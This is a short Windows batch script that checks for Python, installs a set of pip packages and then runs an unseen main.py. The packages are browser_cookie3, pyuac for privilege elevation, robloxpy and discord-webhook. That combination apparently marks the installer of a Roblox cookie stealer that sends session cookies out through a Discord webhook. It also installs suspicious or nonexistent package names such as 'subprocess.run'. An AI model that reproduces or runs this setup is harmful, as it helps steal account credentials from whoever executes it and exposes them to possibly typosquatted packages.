@echo off
echo Checking Python installation...

:: Check if Python is installed
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed. Please install Python and try again.
    exit /b
)

echo Python found. Proceeding with package installation...

:: Upgrade pip
python -m pip install --upgrade pip

:: Install required packages
pip install browser_cookie3
pip install pyuac
pip install subprocess.run
pip install requests
pip install jsonlib-python3
pip install robloxpy
pip install discord-webhook

echo All packages installed.

:: Run main.py
echo Running main.py...
python main.py

pause